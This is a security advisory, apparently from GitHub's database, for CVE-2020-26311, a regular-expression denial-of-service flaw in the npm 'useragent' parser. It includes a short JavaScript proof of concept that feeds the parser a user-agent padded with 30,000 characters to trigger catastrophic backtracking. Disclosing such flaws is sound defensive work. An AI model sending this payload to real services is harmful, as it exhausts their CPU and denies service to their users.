# [M] useragent Regular Expression Denial of Service vulnerability

## Summary
Severity: Medium
Advisory: GHSA-mgfv-m47x-4wqp
CVE: CVE-2020-26311
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-10-26
Source: https://github.com/advisories/GHSA-mgfv-m47x-4wqp
Type: github-advisory

## Affected
- npm: `useragent` — affected >=0

## Details
Useragent is a user agent parser for Node.js. All versions as of time of publication contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS).

## PoC
```js
async function exploit() {
   const useragent = require(\"useragent\");

   // Create a malicious user-agent that leads to excessive backtracking
   const maliciousUserAgent = 'Mozilla/5.0 (' + 'X'.repeat(30000) + ') Gecko/20100101 Firefox/77.0';

   // Parse the malicious user-agent
   const agent = useragent.parse(maliciousUserAgent);

   // Call the toString method to trigger the vulnerability
   const result = await agent.device.toString();
   console.log(result);
}

await exploit();
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-26311
- https://github.com/3rd-Eden/useragent/issues/167
- https://github.com/3rd-Eden/useragent/commit/4c3ee79358bea72d88fe78ac98f4f861db40b89b
- https://github.com/3rd-Eden/useragent
- https://github.com/3rd-Eden/useragent/blob/ffa906f923183c85fbb9e6c90f19345e2bd3c52a/lib/regexps.js#L5568
- https://securitylab.github.com/advisories/GHSL-2020-312-redos-useragent
